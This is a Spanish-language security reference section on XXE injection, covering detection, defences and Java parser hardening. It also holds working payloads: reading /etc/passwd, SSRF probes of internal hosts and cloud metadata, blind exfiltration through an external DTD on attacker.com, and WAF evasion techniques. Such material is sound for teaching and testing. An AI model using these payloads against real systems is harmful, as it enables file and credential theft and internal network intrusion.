# Seguridad Web - XXE (Inyección de Entidades Externas XML)

> Fuente: Base de vulnerabilidades WooYun | Extraído de web-injection.md

## 4. XXE (Inyección de Entidades Externas XML)

### 4.1 Naturaleza de la vulnerabilidad

```
Entrada XML -> el parser habilita DTD/entidades externas -> la referencia de entidad se resuelve y ejecuta -> lectura de archivos/SSRF/RCE
```

**Fórmula central**: XXE = parser XML que permite referencias a entidades externas + entrada XML controlable por el usuario

### 4.2 Métodos de detección

**Identificación de puntos de entrada de alto riesgo**

| Tipo de punto de entrada | Característica de detección | Escenario típico |
|----------|----------|----------|
| Interfaz API | Content-Type contiene `text/xml` o `application/xml` | API RESTful, servicios web SOAP |
| Carga de archivos | Imágenes SVG, DOCX/XLSX/PPTX (en esencia ZIP con XML) | Subida de avatar, importación de documentos |
| Análisis de datos | Importación de configuración XML, feeds RSS/Atom | Panel de administración, funciones de agregación |
| Interacción de protocolos | Autenticación SAML, WebDAV, XMPP | Login SSO, gestión de archivos |

**Flujo rápido de detección**

```
1. Identificar la interfaz que procesa XML → modificar Content-Type a application/xml para probar
2. Enviar una declaración DTD básica → observar si se procesa (diferencias en el error)
3. Intentar una referencia a entidad externa → lectura de archivos conocidos vía protocolo file
4. Sin eco (respuesta visible) → exfiltración fuera de banda (OOB) vía DNS/HTTP de retorno
```

### 4.3 Payloads clásicos

#### Lectura de archivos (con eco de respuesta)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

#### Sondeo SSRF de red interna

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal:8080/">]>
<foo>&xxe;</foo>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

#### Inyección ciega - exfiltración de datos OOB

```xml
<!-- DTD externo (alojado por el atacante en evil.dtd) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>

<!-- Contenido de evil.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

#### Eco mediante mensajes de error

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; e SYSTEM 'file:///nonexistent/%file;'>">
  %error;
  %e;
]>
```

### 4.4 Técnicas de evasión

| Técnica de evasión | Método | Escenario aplicable |
|----------|------|----------|
| Evasión por codificación | XML codificado en UTF-16BE/LE, UTF-7 | WAF basado en coincidencia de patrones ASCII |
| Anidamiento de entidades de parámetro | `%entity;` en lugar de `&entity;` | Cuando se filtra la entidad general `&` |
| XInclude | `<xi:include href="file:///etc/passwd"/>` | Cuando no se puede controlar la declaración DOCTYPE |
| Incrustación en SVG | Entidad XXE incrustada dentro de un archivo SVG | Cuando solo se permite la subida de imágenes |
| Incrustación en DOCX/XLSX | Modificar `[Content_Types].xml` dentro del documento Office | Funciones de subida de documentos |
| Envoltura con CDATA | Usar una sección CDATA para eludir restricciones de caracteres especiales | Lectura de archivos que contienen caracteres especiales de XML |

### 4.5 Medidas de defensa

```java
// Java: deshabilitar DTD y entidades externas
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

- Deshabilitar el procesamiento de DTD y la resolución de entidades externas (opción preferida)
- Usar JSON en lugar de XML para el intercambio de datos
- Validación mediante lista blanca de entradas, actualizar la librería de análisis XML
- Reglas de WAF para bloquear las palabras clave `<!DOCTYPE`/`<!ENTITY`/`SYSTEM`

---
